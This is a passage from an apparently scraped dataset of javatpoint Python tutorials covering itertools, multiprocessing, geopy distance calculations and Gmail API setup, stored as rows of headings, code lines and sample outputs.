operator.mul)))', 'import itertools', '# declaring list 1', 'list1 = [1, 2, 3, 4]', '# declaring list 2', 'list2 = [1, 5, 6, 8]', '# declaring list 3', 'list3 = [9, 10, 11, 12]', '# using chain() function that will to print all elements of lists', 'print(""The output is : "", end="""")', 'print(list(itertools.chain(list1, list2, list3)))', 'import itertools', '# initializing list', 'list1 = [2, 4, 5, 7, 8]', '# using dropwhile() iterator that will print start displaying after condition is false', 'print(""The output is : "", end="""")', 'print(list(itertools.dropwhile(lambda x: x % 2 == 0, list1)))', 'import itertools', '# declaring list', 'list1 = [12, 14, 15, 27, 28]', '# using filterfalse() iterator that will print false values', 'print(""The Output is: "", end="""")', 'print(list(itertools.filterfalse(lambda x: x % 2 == 0, list1)))', 'import itertools', '# Declaring list', 'list1 = [12, 34, 65, 73, 80, 19, 20]', '# using islice() iterator that will slice the list acc. to given argument', '# starts printing from 3nd index till 8th skipping 2', 'print(""The sliced list values are : "", end="""")', 'print(list(itertools.islice(list1, 2, 8, 2)))', 'import itertools', '# Declaring list that contain tuple as element', 'list1 = [(10, 20, 15), (18, 40, 19), (53, 42, 90), (16, 12, 27)]', '# using starmap() iterator for selection value acc. to function', '# selects max of all tuple values', 'print(""The values acc. to function are : "", end="""")', 'print(list(itertools.starmap(max, list1)))', 'import itertools', '# Defining a list', 'list1 = [20, 42, 64, 77, 8, 10, 20]', '# takewhile() iterator is used  to print values till condition return false.', 'print(""Print until 1st false value returned : "", end="""")', 'print(list(itertools.takewhile(lambda x: x % 2 == 0, list1)))', 'import itertools', '# Declaring list', 'li = [1, 2, 3, 4, 5, 6, 7]', '# storing list in iterator', 'iti = iter(li)', '# using tee() iterator to create a list of iterators', '# Creating list of 3 iterators having similar values.', 'it = itertools.tee(iti, 3)', '# It will print object of iterator', 'print(it)', 'print(""The iterators are : "")', 'for i in range(0, 2):', 'print(list(it[i]))', 'import itertools', 'print("" The combined value of iterrables is :"")', ""print(*(itertools.zip_longest('Java', 'Tpoint', fillvalue='_')))""]","[""[(1, 'a'), (2, 'b'), (3, 'c')]"", '<str_iterator object at 0x01505FA0>', '10 15 20 25 30 35 40 45', '1 2 3 1 2 3 1 2 3 1 2', 'Java T Point Java T Point', '[40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40, 40]', 'Computing cartesian product using repeat Keyword Argument:', '[(1, 1), (1, 2), (2, 1), (2, 2)]', 'Computing cartesian product of the containers:', ""[('Java', '5'), ('T', '5'), ('point', '5')]"", 'Computing product of the containers:', ""[('C', 4), ('C', 5), ('D', 4), ('D', 5)]"", 'Computing all permutation of the following list', ""[(3, 'Python'), ('Python', 3)]"", 'Permutations of following string', ""[('A', 'B'), ('B', 'A')]"", 'Permutation of the given container is:', '[(0, 1), (0, 2), (0, 3), (1, 0), (1, 2), (1, 3), (2, 0), (2, 1), (2, 3), (3, 0), (3, 1), (3, 2)]', ""Combination of list in sorted order(without replacement) [('B', 3)]"", ""Combination of string in sorted order [('Z', 'X')]"", 'Combination of list in sorted order [(0,), (1,), (2,), (3,), (4,), (5,), (6,), (7,), (8,), (9,)]', 'Combination of string in sorted order(with replacement) is:', ""[('X', 'X', 'X'), ('X', 'X', 'Y'), ('X', 'Y', 'Y'), ('Y', 'Y', 'Y')]"", 'Combination of list in sorted order(with replacement) is:', '[(4, 4, 4), (4, 4, 2), (4, 2, 2), (2, 2, 2)]', 'Combination of container in sorted order(with replacement) is:', '[(0, 0), (0, 1), (0, 2), (1, 1), (1, 2), (2, 2)]', 'The sum is : [1, 5, 10, 17, 26, 37]', 'The product is : [1, 4, 20, 140, 1260, 13860]', 'The sum is : [1, 5, 10, 17, 26, 37]', 'The product is : [1, 4, 20, 140, 1260, 13860]', 'The output is: [1, 2, 3, 4, 1, 5, 6, 8, 9, 10, 11, 12]', 'The output is  : [5, 7, 8]', 'The Output is : [15, 27]', 'The sliced list values are : [34, 73, 19]', 'The values acc. to function are : [20, 40, 90, 27]', 'The list values until false value return : [20, 42, 64]', '(<itertools._tee object at 0x01B88D88>, <itertools._tee object at 0x01B88DA8>, <itertools._tee object at 0x01B88BA8>)', 'The iterators are :', '[1, 2, 3, 4, 5, 6, 7]', '[1, 2, 3, 4, 5, 6, 7]', 'The combined value of iterables is :', ""('J', 'T') ('a', 'p') ('v', 'o') ('a', 'i') ('_', 'n') ('_', 't')""]","['Iterator|||Argument|||Results&&&count(start,step)|||start, [step]|||start, start+step, step+2*step&&&cycle()|||P|||p0,p1,….plast&&&repeat()|||elem [,n]|||elem, elem, elem,….endlessly or upto n times']","['|||Infinite iterators|||Combinatoric iterators|||Terminating iterators||||||count(start, stop): It prints from the start value to infinite. The step argument is optional, if the value is provided to the step then the number of steps will be skipped. Consider the following example:||||||cycle(iterable): This iterator prints all value in sequence from the passed argument. It prints the values in a cyclic manner. Consider the following example:||||||repeat(val,num): As the name suggests, it repeatedly prints the passed value for infinite time. The num argument is optional. Consider the following example:||||||Product() - It is used to calculate the cartesian product of input iterable. In this function, we use the optional repeat keyword argument for computation of the product of an iterable with itself. The repeat keyword represents the number of repetitions. It returns output in the form of sorted tuples. Consider the following example:||||||Permutations(): It is used to generate all possible permutation of an iterable. The uniqueness of each element depends upon their position instead of values. It accepts two argument iterable and group_size. If the value of group_size is none or not specified then group_size turns into length of the iterable.||||||Combinations(): It is used to print all the possible combinations (without replacement) of the container which is passed as argument in the specified group size in sorted order.||||||Combination_with_replacement(): It accepts two arguments, first argument is a r-length tuple and the second argument is repetition. It returns a subsequence of length n from the elements of the iterable and repeat the same process. Separate elements may repeat itself in combination_with_replacement()||||||accumulate(iter, func): It takes two arguments, the first argument is iterable and the second is a function which would be followed at each iteration of value in iterable. If the function is not defined in accumulate() iterator, addition takes place by default. The output iterable depends on the input iterable; if input iterable contains no value then the output iterable will also be empty.||||||chain(iter1, iter2) - It is used to print all the values in iterable passed in the form of chain and declared in arguments. Consider the following example:||||||dropwhile(func, seq) - It starts printing the character only after the func. Consider the following argument:||||||filterfalse(func,seq) - We can assume it by its name, as this iterator prints only those values that return false for the passed function. Consider the following example:||||||islice(iterable,start,stop,step) - It slices the given iterable according to given position. It accepts four arguments respectively and these are iterable, container, starting pos., ending position and step(optional).||||||starmap(func, tuple list) - It takes two arguments; first argument is function and second argument is list which consists element in the form of tuple. Consider the following example.||||||takewhile(func, iterable) - It is visa-versa of dropwhile(). It will print values until it returns false condition. Consider the following example:||||||tee(iterator, count) - It divides the container into a number of iterators which is defined in the argument. Consider the following example:||||||zip_longest(iterable1, iterable2, fillval) - It prints the values of iterable alternatively in sequence. If one of the iterable prints all values, remaining values are filled by the values assigned to fill value.|||']"
57,['Python Multiprocessing'],"['In this article, we will learn how we can achieve multiprocessing using Python. We also discuss its advanced concepts.']","['https://www.javatpoint.com/python-oops-concepts', 'https://www.javatpoint.com/python-itertools', 'https://www.javatpoint.com/https://www.javatpoint.com/cpu-full-form', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/central-processing-unit', 'https://www.javatpoint.com/python-oops-concepts', 'https://www.javatpoint.com/python-itertools', 'https://www.javatpoint.com/python-oops-concepts']",[],[],"['Multiprocessing In Python', 'Python Multiprocessing Classes', 'Python Multiprocessing Using Queue Class', 'Python Multiprocessing Lock Class', 'Python Multiprocessing Example', 'Python Multiprocessing Pool', 'Proxy Objects', 'Commonly Used Functions of Multiprocessing']","['What is Multiprocessing?', 'Why Multiprocessing?']",[],"['In the multiprocessing, the CPU can assign multiple tasks at one each task has its own processor.', ""Let's understand the simple example of multiple processing."", 'Explanation:', ""Let's understand the following example of the multiprocessing with arguments."", 'Example - 2', 'Explanation -', 'We have used the start() method to start the process.', ""Let's see the simple example of a get number of CPUs currently in the system."", 'The above number of CPUs can vary for your pc. For us, the number of cores is 32.', 'Explanation -', ""In the following example, we will merge all the multiprocessing classes together. Let's see the below example."", ""Let's understand another example of the multiprocessing Pool."", 'Example - 2', 'The proxy objects are picklable so we can pass them between processes. These objects are also used for level of control over the synchronization.']","['Processing units share the main memory and peripherals to process programs simultaneously. Multiprocessing Application breaks into smaller parts and runs independently. Each process is allocated to the processor by the operating system.', 'Python provides the built-in package called multiprocessing which supports swapping processes. Before working with the multiprocessing, we must aware with the process object.', 'Multiprocessing is essential to perform the multiple tasks within the Computer system. Suppose a computer without multiprocessing or single processor. We assign various processes to that system at the same time.', 'Therefore, multiprocessing is essential to perform several task at the same time without interruption. It also makes easy to track all the tasks. That is why the concept of multiprocessing is to arise.', 'Python provides the multiprocessing module to perform multiple tasks within the single system. It offers a user-friendly and intuitive API to work with the multiprocessing.', ""In the above example, We created the two functions - the cube() function calculates the given number's cube, and the square() function calculates the square of the given number."", 'As we can see in the output, it waits to completion of process one and then process 2. The last statement is executed after both processes are finished.', ""Queues are passed as a parameter in the Process' target function to allow the process to consume data. The Queue provides the put() function to insert the data and get() function to get data from the queues. Let's understand the following example."", 'Python multiprocessing pool is essential for parallel execution of a function across multiple input values. It is also used to distribute the input data across processes (data parallelism). Consider the following example of a multiprocessing Pool.']","['Multiprocessing is the ability of the system to run one or more processes in parallel. In simple words, multiprocessing uses the two or more CPU within the single computer system. This method is also capable to allocate the tasks between more than one process.', 'It will then have to interrupt the previous task and move to another to keep all processes going. It is as simple as a chef is working alone in the kitchen. He has to do several tasks to cook food such as cutting, cleaning, cooking, kneading dough, baking, etc.', 'In the above code, we have imported the Process class then create the Process object within the disp() function. Then we started the process using the start() method and completed the process with the join() method. We can also pass the arguments in the declared function using the args keywords.', 'Next, we defined the process object of the Process class that has two arguments. The first argument is a target that represents the function to be executed, and the second argument is args that represents the argument to be passed within the function.', 'Python multiprocessing module provides many classes which are commonly used for building parallel program. We will discuss its main classes - Process, Queue and Lock. We have already discussed the Process class in the previous example. Now we will discuss the Queue and Lock classes.', 'We know that Queue is important part of the data structure. Python multiprocessing is precisely the same as the data structure queue, which based on the ""First-In-First-Out"" concept. Queue generally stores the Python object and plays an essential role in sharing data between processes.', 'In the above code, we have imported the Queue class and initialized the list named fruits. Next, we assigned a count to 1. The count variable will count the total number of elements. Then, we created the queue object by calling the Queue() method. This object will used to perform operations in the Queue. In for loop, we inserted the elements one by one in the queue using the put() function and increased the count by 1 with each iteration of loop.', 'The multiprocessing Lock class is used to acquire a lock on the process so that we can hold the other process to execute a similar code until the lock has been released. The Lock class performs mainly two tasks. The first is to acquire a lock using the acquire() function and the second is to release the lock using the release() function.', ""Suppose we have multiple tasks. So, we create two queues: the first queue will maintain the tasks, and the other will store the complete task log. The next step is to instantiate the processes to complete the task. As discussed previously, the Queue class is already synchronized, so we don't need to acquire a lock using the Lock class."", 'The proxy objects are referred to as shared objects which reside in a different process. This object is also called as a proxy. Multiple proxy objects might have a similar referent. A proxy object consists of various methods which are used to invoked corresponding methods of its referent. Below is the example of proxy objects.', 'So far, we have discussed the basic concepts of multiprocessing using Python. Multiprocessing is a broad topic itself and essential for performing various tasks within a single system. We are defining a few essential functions that are commonly used to achieve multiprocessing.']","['from multiprocessing import Process', 'def disp():', ""print ('Hello !! Welcome to Python Tutorial')"", ""if __name__ == '__main__':"", 'p = Process(target=disp)', 'p.start()', 'p.join()', '# Python multiprocessing example', '# importing the multiprocessing module', 'import multiprocessing', 'def cube(n):', '# This function will print the cube of the given number', 'print(""The Cube is: {}"".format(n * n * n))', 'def square(n):', '# This function will print the square of the given number', 'print(""The Square is: {}"".format(n * n))', 'if __name__ == ""__main__"":', '# creating two processes', 'process1 = multiprocessing.Process(target= square, args=(5, ))', 'process2 = multiprocessing.Process(target= cube, args=(5, ))', '# Here we start the process 1', 'process1.start()', '# Here we start process 2', 'process2.start()', '# The join() method is used to wait for process 1 to complete', 'process1.join()', '# It is used to wait for process 1 to complete', 'process2.join()', '# Print if both processes are completed', 'print(""Both processes are finished"")', 'process1 = multiprocessing.Process(target= square, args=(5, ))', 'process2 = multiprocessing.Process(target= cube, args=(5, ))', 'process1.start()', 'process2.start()', 'import multiprocessing', 'print(""The number of CPU currently working in system : "", multiprocessing.cpu_count())', '# Importing Queue Class', 'from multiprocessing import Queue', ""fruits = ['Apple', 'Orange', 'Guava', 'Papaya', 'Banana']"", 'count = 1', '# creating a queue object', 'queue = Queue()', ""print('pushing items to the queue:')"", 'for fr in fruits:', ""print('item no: ', count, ' ', fr)"", 'queue.put(fr)', 'count += 1', ""print('\\npopping items from the queue:')"", 'count = 0', 'while not queue.empty():', ""print('item no: ', count, ' ', queue.get())"", 'count += 1', 'from multiprocessing import Lock, Process, Queue, current_process', 'import time', 'import queue', 'def jobTodo(tasks_to_perform, complete_tasks):', 'while True:', 'try:', '# The try block to catch task from the queue.', '# The get_nowait() function is used to', '# raise queue.Empty exception if the queue is empty.', 'task = tasks_to_perform.get_nowait()', 'except queue.Empty:', 'break', 'else:', '# if no exception has been raised, the else block will execute', '# add the task completion', '', 'print(task)', ""complete_tasks.put(task + ' is done by ' + current_process().name)"", 'time.sleep(.5)', 'return True', 'def main():', 'total_task = 8', 'total_number_of_processes = 3', 'tasks_to_perform = Queue()', 'complete_tasks = Queue()', 'number_of_processes = []', 'for i in range(total_task):', 'tasks_to_perform.put(""Task no "" + str(i))', '# defining number of processes', 'for w in range(total_number_of_processes):', 'p = Process(target=jobTodo, args=(tasks_to_perform, complete_tasks))', 'number_of_processes.append(p)', 'p.start()', '# completing process', 'for p in number_of_processes:', 'p.join()', '# print the output', 'while not complete_tasks.empty():', 'print(complete_tasks.get())', 'return True', ""if __name__ == '__main__':"", 'main()', 'from multiprocessing import Pool', 'import time', 'w = ([""V"", 5], [""X"", 2], [""Y"", 1], [""Z"", 3])', 'def work_log(data_for_work):', 'print("" Process name is %s waiting time is %s seconds"" % (data_for_work[0], data_for_work[1]))', 'time.sleep(int(data_for_work[1]))', 'print("" Process %s Executed."" % data_for_work[0])', 'def handler():', 'p = Pool(2)', 'p.map(work_log, w)', ""if __name__ == '__main__':"", 'handler()', 'from multiprocessing import Pool', 'def fun(x):', 'return x*x', ""if __name__ == '__main__':"", 'with Pool(5) as p:', 'print(p.map(fun, [1, 2, 3]))', 'from multiprocessing import Manager', 'manager = Manager()', 'l = manager.list([i*i for i in range(10)])', 'print(l)', 'print(repr(l))', 'print(l[4])', 'print(l[2:5])']","[""'Hello !! Welcome to Python Tutorial'"", 'The Cube is: 125', 'The Square is: 25', 'Both processes are finished', ""('The number of CPU currently woking in system : ', 32)"", 'pushing items to the queue:', ""('item no: ', 1, ' ', 'Apple')"", ""('item no: ', 2, ' ', 'Orange')"", ""('item no: ', 3, ' ', 'Guava')"", ""('item no: ', 4, ' ', 'Papaya')"", ""('item no: ', 5, ' ', 'Banana')"", 'popping items from the queue:', ""('item no: ', 0, ' ', 'Apple')"", ""('item no: ', 1, ' ', 'Orange')"", ""('item no: ', 2, ' ', 'Guava')"", ""('item no: ', 3, ' ', 'Papaya')"", ""('item no: ', 4, ' ', 'Banana')"", 'Task no 2', 'Task no 5', 'Task no 0', 'Task no 3', 'Task no 6', 'Task no 1', 'Task no 4', 'Task no 7', 'Task no 0 is done by Process-1', 'Task no 1 is done by Process-3', 'Task no 2 is done by Process-2', 'Task no 3 is done by Process-1', 'Task no 4 is done by Process-3', 'Task no 5 is done by Process-2', 'Task no 6 is done by Process-1', 'Task no 7 is done by Process-3', 'Process name is V waiting time is 5 seconds', 'Process V Executed.', 'Process name is X waiting time is 2 seconds', 'Process X Executed.', 'Process name is Y waiting time is 1 seconds', 'Process Y Executed.', 'Process name is Z waiting time is 3 seconds', 'Process Z Executed.', '[1, 8, 27]', '[0, 1, 4, 9, 16, 25, 36, 49, 64, 81]', ""<ListProxy object, typeid 'list' at 0x7f063621ea10>"", '16', '[4, 9, 16]']","['Method|||Description&&&pipe()|||The pipe() function returns a pair of connection objects.&&&run()|||The run() method is used to represent the process activities.&&&start()|||The start()method is used to start the process.&&&join([timeout])|||The join() method is used to block the process until the process whose join() method is called terminates. The timeout is optional argument.&&&is_alive()|||It returns if process is alive.&&&terminate()|||As the name suggests, it is used to terminate the process. Always remember - the terminate() method is used in Linux, for Windows, we use TerminateProcess() method.&&&kill()|||This method is similar to the terminate() but using the SIGKILL signal on Unix.&&&close()|||This method is used to close the Process object and releases all resources associated with it.&&&qsize()|||It returns the approximate size of the queue.&&&empty()|||If queue is empty, it returns True.&&&full()|||It returns True, if queue is full.&&&get_await()|||This method is equivalent get(False).&&&get()|||This method is used to get elements from the queue. It removes and returns an element from queue.&&&put()|||This method is used to insert an element into the queue.&&&cpu_count()|||It returns the number of working CPU within the system.&&&current_process()|||It returns the Process object corresponding to the current process.&&&parent_process()|||It returns the parent Process object corresponding to the current process.&&&task_done()|||This function is used indicate that an enqueued task is completed.&&&join_thread()|||This method is used to join the background thread']",['|||Multiprocessing can be represented as a computer with more than one central processor.|||A Multi-core processor refers to single computing component with two or more independent units.|||']
58,['How to Calculate Distance between Two Points using GEOPY.'],"['The geopy is a Python library which helps to calculate geographical distance. In this tutorial, we will discuss different methods of how the user can calculate the distance between two places on the earth.']","['https://www.javatpoint.com/gmail-api-in-python', 'https://www.javatpoint.com/eel-in-python', 'https://www.javatpoint.com/gmail-api-in-python', 'https://www.javatpoint.com/eel-in-python', 'https://www.javatpoint.com/gmail-api-in-python']",[],[],"['Calculate Distance between Two Points', 'Conclusion']","['Method 1: By using Geodesic Distance', 'Method 2: By using Great Circle Distance', 'Method 3: By using Haversine Formula']",[],"['First, the user has to install the geopy by using the following command:', 'After successful installation, we are ready to work with the geopy library.', 'Below are the important methods that used to calculate the distance between two points.', ""The orthodromic distance is used for calculating the shortest distance between two latitudes and longitudes points on the earth's surface."", 'Using this method, the user needs to have the coordinates of two points (P and Q).', 'Now, calculate the distance between two points by using the following formula.', 'For miles:', 'For kilometre:', 'Thus, the user can calculate the shortest distance between the two given points on Earth by using Haversine Formula.']","['The geodesic distance is the length of the shortest path between two points on any surface of Earth. In the following example, we will show how the user can calculate the Geodesic Distance from the latitude and longitude data.', 'The user needs the coordinates of P point and Q points in terms of longitude and latitude, then using the above formula for converting them into radians.', ""In this tutorial, we have discussed various methods for calculating the distance between two points on the earth's surface by using the geopy library. We have shown examples of each method.""]","['The great circle distance is the shortest path between two points on the sphere. In this case, we will assume the earth is the perfect sphere. The following example shows how the user can calculate great circle distance by using longitude and latitude data of two points.', 'First, they have to convert the values of latitude and longitude points from decimal degrees to radians and then divide the values of latitude and longitude by (180/π). The user should use the value of ""π = 22/7"". Then, the value of (180/π) will be ""57.29577"". If the user wants to calculate the distance in miles, they can use the value of the radius of Earth, that is, ""3,963"". And if the user wants to calculate the distance in Kilo-metre, they can use the value ""6,378.80"".']","['pip install geopy', '# First, import the geodesic module from the geopy library', 'from geopy.distance import geodesic as GD', '# Then, load the latitude and longitude data for New York & Texas', 'New_York = (40.7128, 74.0060)', 'Texas = (31.9686, 99.9018)', '# At last, print the distance between two points calculated in kilo-metre', 'print (""The distance between New York and Texas is: "", GD(New_York, Texas).km)', '# First, import the great_circle module from the geopy library', 'from geopy.distance import great_circle as GC', '# Then, load the latitude and longitude data for New York & Texas', 'New_York = (40.7128, 74.0060)', 'Texas = (31.9686, 99.9018)', '# At last, print the distance between two points calculated in kilo-metre', 'print (""The distance between New York and Texas is: "", GC(New_York, Texas).km)', 'How to calculate the value of latitude in radians:', 'The value of Latitude in Radian: Latitude (La1) = La1 / (180/?)', 'The value of Latitude in Radian: Latitude (La1) = La1 / 57.29577', 'How to calculate the value of longitude in radians:', 'The value of Longitude in Radian: Longitude (Lo1) = Lo1 / (180/?)', 'The value of Longitude in Radian: Longitude (Lo1) = Lo1 / 57.29577', 'Distance (D) = 3963.0 * arccos[(sin(La1) * sin(La2)) + cos(La1) * cos(La2) * cos(Lo2 - Lo1)]', 'Distance (D) = 3963.0 * arccos[(sin(La1) * sin(La2)) + cos(La1) * cos(La2) * cos(Lo2 - Lo1)]', 'from math import radians, cos, sin, asin, sqrt', '# For calculating the distance in Kilometres', 'def distance_1(La1, La2, Lo1, Lo2):', '# The math module contains the function name ""radians"" which is used for converting the degrees value into radians.', 'Lo1 = radians(Lo1)', 'Lo2 = radians(Lo2)', 'La1 = radians(La1)', 'La2 = radians(La2)', '# Using the ""Haversine formula""', 'D_Lo = Lo2 - Lo1', 'D_La = La2 - La1', 'P = sin(D_La / 2)**2 + cos(La1) * cos(La2) * sin(D_Lo / 2)**2', 'Q = 2 * asin(sqrt(P))', '# The radius of earth in kilometres.', 'R_km = 6371', '# Then, we will calculate the result', 'return(Q * R_km)', '', '# driver code', 'La1 = 40.7128', 'La2 = 31.9686', 'Lo1 = -74.0060', 'Lo2 = -99.9018', 'print (""The distance between New York and Texas is: "", distance_1(La1, La2, Lo1, Lo2), ""K.M"")', '# For calculating the distance in Miles', 'def distance_2(La1, La2, Lo1, Lo2):', '# The math module contains the function name ""radians"" which is used for converting the degrees value into radians.', 'Lo1 = radians(Lo1)', 'Lo2 = radians(Lo2)', 'La1 = radians(La1)', 'La2 = radians(La2)', '# Using the ""Haversine formula""', 'D_Lo = Lo2 - Lo1', 'D_La = La2 - La1', 'P = sin(D_La / 2)**2 + cos(La1) * cos(La2) * sin(D_Lo / 2)**2', 'Q = 2 * asin(sqrt(P))', '# The radius of earth in Miles.', 'R_Mi = 3963', '# Then, we will calculate the result', 'return(Q * R_Mi)', 'print (""The distance between New York and Texas is: "", distance_2(La1, La2, Lo1, Lo2), ""Miles"")']","['The distance between New York and Texas is:  2507.14797665193', 'The distance between New York and Texas is:  2503.045970189156', 'The distance between New York and Texas is:  2503.04243426357 K.M', 'The distance between New York and Texas is:  1556.985899699659 Miles']",[],[]
59,['Gmail API in Python'],"['In this tutorial, we are going to learn about Gmail API in Python, and we will also learn how we can use Gmail APIs in Python to perform many Gmail operations such as sending an email, searching an email, deleting an email, etc. For this, we will learn to set up Gmail API in our Python script. First, let us have a brief of Gmail API and its basic introduction.']","['https://www.javatpoint.com/how-to-plot-the-google-map-using-folium-package-in-python', 'https://www.javatpoint.com/how-to-calculate-distance-between-two-points-using-geopy', 'https://www.javatpoint.com/https://www.javatpoint.com/restful-web-services-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com/how-to-plot-the-google-map-using-folium-package-in-python', 'https://www.javatpoint.com/how-to-calculate-distance-between-two-points-using-geopy', 'https://www.javatpoint.com/how-to-plot-the-google-map-using-folium-package-in-python']","['https://static.javatpoint.com/python/images/gmail-api-in-python.png', 'https://static.javatpoint.com/python/images/gmail-api-in-python2.png', 'https://static.javatpoint.com/python/images/gmail-api-in-python3.png', 'https://static.javatpoint.com/python/images/gmail-api-in-python4.png', 'https://static.javatpoint.com/python/images/gmail-api-in-python5.png', 'https://static.javatpoint.com/python/images/gmail-api-in-python6.png', 'https://static.javatpoint.com/python/images/gmail-api-in-python7.png', 'https://static.javatpoint.com/python/images/gmail-api-in-python8.png', 'https://static.javatpoint.com/python/images/gmail-api-in-python9.png', 'https://static.javatpoint.com/python/images/gmail-api-in-python10.png', 'https://static.javatpoint.com/python/images/gmail-api-in-python11.png', 'https://static.javatpoint.com/python/images/gmail-api-in-python12.png']",[],"['Gmail APIs', 'Performing Actions using Gmail APIs in Python', 'Conclusion']","['Prerequisites of Using Gmail APIs in Python', 'Installation of Required libraries:', 'Enabling Gmail APIs in our device', 'Sending an email']","['Note: We have to save the client ID and password so that we can use them in future references if required.', ""Note: Of course, we have to put our mail that we can connect to Gmail APIs and use for future references for working with Gmail APIs, in the place of '[email\xa0protected]' as provided in the above program.""]","['We must fulfil the following requirements for using Gmail APIs in our Python script:', 'Step 1: Open the command prompt terminal of the system and make sure that our device has an active internet connection.', 'Step 2: Write down the following command in the terminal:', 'Now, press enter to start the installation of libraries.', 'We have to follow the following given steps to enable Gmail APIs in our device so that we can use these APIs in our Python script:', 'Step 1: Creating New Project on Google Cloud console:', 'If we already have an existing project, then we can also continue with the existing project.', 'Step 2: Now, we have to go to the API and services option from the Project menu that we have created.', ""Step 3: Now, we can see the option 'Enable Gmail API and services,' and we have to choose this option to enable Gmail APIs for the project."", 'Step 4: Configuration of Consent screen:', 'Step 5: Now, we have to enter the application name of our choice and save the project.', 'Step 6: Now, click on the credentials option and go to credentials.', 'Step 7: Creating an OAuth Client ID:', ""Now, we click on the 'create credentials' option and go to the OAuth Client ID to create it."", 'We perform this by following the below sequential procedure to create a new OAuth Client ID for our project:', 'Now, we are done with all the steps of enabling Gmail APIs, and we can start using Gmail APIs in our Python script.', 'Importing Necessary Modules', 'Explanation -', 'We can perform the following Gmail actions with our Python script using Gmail APIs in it:', 'Look at the following Python program for a better understanding of it:']","['Gmail API is APIs based on RESTful APIs that allow its users to interact with our Gmail account, and it helps us to use its features using a Python script.', ""Before enabling the Gmail APIs to use them in our Python script, let's first install the pre-required libraries in our system. To install the pre-required libraries for enabling the Gmail APIs, we should follow the following steps:"", 'As we can see that, the pre-required libraries for enabling Gmail APIs are successfully installed in our system. Now, we can proceed with enabling Gmail APIs part in this tutorial.', ""In this step, first, we have to login into the Google cloud console (https://console.cloud.google.com/?pli=1) with our Google account, and then we have to click on 'New Project' to create a new project."", ""Now, in this step, we will configure the consent screen of the project we created by clicking on the 'OAuth Consent Screen' option given in the menu. We can only see this option if the consent screen is not already configured."", ""Now, we have set up all the necessary APIs and we should forward with importing all the necessary modules. Let's see the below example of importing modules."", 'Now, we tick the checkbox option shown in the dialogue box to give the required permissions, and then, we will have to click on the continue option. After clicking on continue, we can see the following window will open in the same tab:', 'As the window is showing, the authentication part for enabling Gmail API is completed, and we have linked our Gmail account with the project for Gmail APIs we created.', 'Now, we have completely set up and enabled Gmail APIs in our project with Python script. Now, we can perform many actions from our Gmail account with a Python program.', 'In this tutorial, we will only about sending an email using Gmail APIs in our Python program, and we will learn to write the code to perform this action with Python script.', 'We can simply write and send an email by writing a Python program and using enabled Gmail APIs in it. Here, in this section, we will write a Python program by which we can send emails from our Gmail account just by running the program.', ""If we put our mail in the place of the receiver's mail, i.e., [email\xa0protected], we will find that the mail is actually sent to the mail we entered as receiver's mail when we run the program, same as what we can see in the above output image."", 'To use the Gmail APIs with our Python script or simply in Python, first, we have to enable them, and create a Project in Google cloud with our Gmail account.']","[""Gmail is the most popular mail service in today's world, and it is used by almost all of us and many organizations. Over past years, many Gmail features are enhanced with the use of AI, including suggestions while composing emails and security features (detecting fraud and spam emails)."", ""When we run the above given program, we will see an option to choose the browser, as we can see in the above image, and if we don't see an option like this, we need to click on the link given in the output. Then, we can select the browser of our choice or the default browser of the system to continue the process. Now, when we select the browser, we will be redirected to our browser and can see the following tab opened in it:"", 'We can also perform many other actions like reading, deleting, etc., using Gmail APIs in our Python program like sending emails. We can also modify many things into our Gmail account that we authenticated with our Gmail APIs project, just by running our Python scripts (enabled with Gmail APIs).']","['pip install --upgrade google-api-python-client google-auth-httplib2 google-auth-oauthlib', '# Importing os and pickle module in program', 'import os', 'import pickle', '# Creating utils for Gmail APIs', 'from googleapiclient.discovery import build', 'from google_auth_oauthlib.flow import InstalledAppFlow', 'from google.auth.transport.requests import Request', '# Importing libraries for encoding/decoding messages in base64', 'from base64 import urlsafe_b64decode, urlsafe_b64encode', '# Importing libraries for dealing with the attachment of MIME types in Gmail', 'from email.mime.text import MIMEText', 'from email.mime.multipart import MIMEMultipart', 'from email.mime.image import MIMEImage', 'from email.mime.audio import MIMEAudio', 'from email.mime.base import MIMEBase', 'from email.mime.multipart import MIMEMultipart', 'from mimetypes import guess_type as guess_mime_type', '# Request all access from Gmail APIs and project', ""SCOPES = ['https://mail.google.com/']"", ""OurEmailID = 'OurMail@gmail.com' # giving our Gmail Id"", '# using a default function to authenticate Gmail APIs', 'def authenticateGmailAPIs():', 'creds = None', '# Authorizing the Gmail APIs with tokens of pickles', 'if os.path.exists(""token.pickle""): # using if else statement', 'with open(""token.pickle"", ""rb"") as token:', 'creds = pickle.load(token)', '# If there are no valid credentials available in device, we will let the user sign in manually', 'if not creds or not creds.valid:', 'if creds and creds.expired and creds.refresh_token:', 'creds.refresh(Request())', 'else:', ""flow = InstalledAppFlow.from_client_secrets_file('client_secret_107196167488-dh4b2pmpivffe011kic4em9a4ugrcooi.apps.googleusercontent.com.json', SCOPES) # downloaded credential name"", 'creds = flow.run_local_server(port=0) # running credentials', '# Save the credentials for the next run', 'with open(""token.pickle"", ""wb"") as token:', 'pickle.dump(creds, token)', ""return build('Gmail', 'v1', credentials=creds) # using Gmail to authenticate"", '# Get the Gmail API service by calling the function', 'service = authenticateGmailAPIs()', '# importing os and pickle module in program', 'import os', 'import pickle', '# Creating utils for Gmail APIs', 'from googleapiclient.discovery import build', 'from google_auth_oauthlib.flow import InstalledAppFlow', 'from google.auth.transport.requests import Request', '# Importing libraries for encoding/decoding messages in base64', 'from base64 import urlsafe_b64decode, urlsafe_b64encode', '# Importing libraries for dealing with the attachment of MIME types in Gmail', 'from email.mime.text import MIMEText', 'from email.mime.multipart import MIMEMultipart', 'from email.mime.image import MIMEImage', 'from email.mime.audio import MIMEAudio', 'from email.mime.base import MIMEBase', 'from email.mime.multipart import MIMEMultipart', 'from mimetypes import guess_type as guess_mime_type', '# Request all access from Gmail APIs and project', ""SCOPES = ['https://mail.google.com/'] # providing the scope for Gmail APIs"", ""OurEmailID = 'OurMail@gmail.com' # giving our Gmail Id"", '# using a default function to authenticate Gmail APIs', 'def authenticateGmailAPIs():', 'creds = None', '# authorizing the Gmail APIs with tokens of pickles', 'if os.path.exists(""token.pickle""): # using if else statement', 'with open(""token.pickle"", ""rb"") as token:', 'creds = pickle.load(token)', '# if there are no valid credentials available in device, we will let the user sign in manually', 'if not creds 